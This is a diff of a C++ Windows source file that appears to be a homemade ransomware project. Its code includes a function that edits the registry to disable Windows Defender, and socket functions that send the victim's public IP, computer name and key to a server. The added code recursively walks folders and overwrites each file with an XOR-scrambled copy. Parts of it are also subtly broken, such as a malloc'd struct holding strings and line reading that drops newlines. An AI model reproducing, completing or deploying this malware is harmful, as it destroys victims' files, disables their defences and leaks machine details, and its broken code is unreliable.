@@ -1,8 +1,12 @@
 ﻿#include "gg.h"
-#include <filesystem>
+#include <vector>
+#include <map>
+#include <stdlib.h>
 
 
-// Function to check if the application is running with administrative privileges
+uint32_t FULL_NUM_FOR_FILE_HANDLE = 0;
+std::map<int, __userDetails__> userDetails;
+
 bool IsAdministrator(HRESULT& rHr)
 {
     bool bIsAdmin = false;
@@ -24,7 +28,7 @@ bool IsAdministrator(HRESULT& rHr)
         ATL::CSid::CSidArray groupSids;
         ATL::CAtlArray<DWORD> groupAttribs;
         groups.GetSidsAndAttributes(&groupSids, &groupAttribs);
-        for (UINT i = 0; !bIsAdmin && i < groupSids.GetCount(); i++)
+        for (uint32_t i = 0; !bIsAdmin && i < groupSids.GetCount(); i++)
         {
             bIsAdmin = groupSids.GetAt(i) == ATL::Sids::Admins();
         }
@@ -113,7 +117,7 @@ bool open_camera_app()
 	return result == 0;
 }
 // -----------------------------------------------------------------------------------
-bool disable_defender() // dosent work for production!!!!!!!
+bool disable_defender() // dosent work for production!!!!!!
 // -----------------------------------------------------------------------------------
 {
     HKEY hkey = NULL;
@@ -144,7 +148,7 @@ bool disable_defender() // dosent work for production!!!!!!!
         return false;
     }
 }
-
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 std::string get_file_folder(std::string file_path)
 {
     return file_path.substr(0, file_path.find_last_of("\\/"));
@@ -218,7 +222,7 @@ std::string fetch_ip_address()
     return result;
 }
 
-SOCKET cnnect_to_server()
+SOCKET connect_to_server()
 {
     WSADATA wsaData;
     int wserr;
@@ -257,44 +261,113 @@ bool send_data_to_server(SOCKET clientSocket, int key, std::string public_ip)
     }
     return true;
 }
+void saveStrucetInFile(__userDetails__* user_details)
+{
+    std::ofstream file("user_details.txt", std::ios::app);
+    if (!file.is_open()) 
+    {
+        std::cerr << "Failed to open the file." << std::endl;
+        return;
+    }
+    
+    FULL_NUM_FOR_FILE_HANDLE++;
+
+    // Formatting the structure into a string
+    file << "__userDetails__ " << FULL_NUM_FOR_FILE_HANDLE << "\n{\n";
+    file << "\tstd::string ComputerName: " << user_details->ComputerName << ";\n";
+    file << "\tstd::string UserIP: " << user_details->UserIP << ";\n";
+    file << "\tuint32_t key: " << user_details->key << ";\n";
+    file << "}__userDetails__;\n";
+
+    file.close();
+}
 
 std::string conccet_ip_and_computer_name(size_t public_key) 
 {
     std::string public_ip = fetch_ip_address();
     std::string computer_name = fetch_computer_name();
     std::string key_str = std::to_string(public_key);
+    __userDetails__* userDetail = (__userDetails__*)malloc(sizeof(__userDetails__));
+
+
+    userDetail->UserIP = public_ip;
+    userDetail->ComputerName = computer_name;
+
+
     std::string ip_and_computer_name = public_ip + "," + computer_name + "," + key_str;
     return ip_and_computer_name;
 }
 
-bool get_file_folders(int key, std::string folder_path, std::string start)
+bool get_file_folders(int key, std::string folder_path, std::string start, int mode)
 {
-    namespace fs = std::experimental::filesystem;
+    namespace fs = std::filesystem;
 
     for (auto& entry : fs::directory_iterator(folder_path))
     {
         std::string file_path = entry.path().string();
 
-        if (check_for_exe_file(file_path))
+        if (find_folder(file_path))
         {
-            std::cout << start << "Found executable file: " << entry.path().filename().string() << std::endl;
-        }
-        else if (find_folder(file_path))
-        {
-            std::cout << start << "Found folder: " << entry.path().filename().string() << std::endl;
-            get_file_folders(key, file_path, start + "\t");  // Add an extra tab for the next level of recursion
+            get_file_folders(key, file_path, start + "\t", mode);  // Add an extra tab for the next level of recursion
         }
         else
-        {
-            std::cout << start << "Found non-executable file: " << entry.path().filename().string() << std::endl;
+        {   
+			std::cout << start << file_path << std::endl;
+            bool a = 0;
+            if (mode == 1 ? a = EN_DEcrypt_file_folders(key, file_path) : EN_DEcrypt_file_folders(key, file_path));
+
         }
     }
 
     return true;
 }
 
-bool encrypt_file_folders(int key, std::string folder_path)
+bool EN_DEcrypt_file_folders(int key, std::string file_path)
 {
+    char KEY = (char)key;
+    std::ifstream file(file_path); // Input file stream to read the file
+    std::string toEncrypt = "";
+    std::string encrypted = "";
+
+    std::string line;
+    if (file.is_open())
+    {
+        while (std::getline(file, line))
+        {
+            toEncrypt += line; // Read the entire file content
+        }
+        file.close(); // Close the file after reading
+    }
+    else
+    {
+        std::cerr << "Unable to open file for reading: " << file_path << std::endl;
+        return false;
+    }
+
+    // Encrypting the file content
+    int count = 0;
+    for (auto c : toEncrypt)
+    {
+        count++;
+        encrypted += (char)(c ^ KEY);
+        if (count % 50 == 0)
+        {
+            encrypted += "\n"; 
+        }
+    }
+
+    std::ofstream outFile(file_path, std::ios::trunc); 
+    if (outFile.is_open())
+    {
+        outFile << encrypted;
+        outFile.close();
+    }
+    else
+    {
+        std::cerr << "Unable to open file for writing: " << file_path << std::endl;
+        return false;
+    }
+
     return true;
 }
 
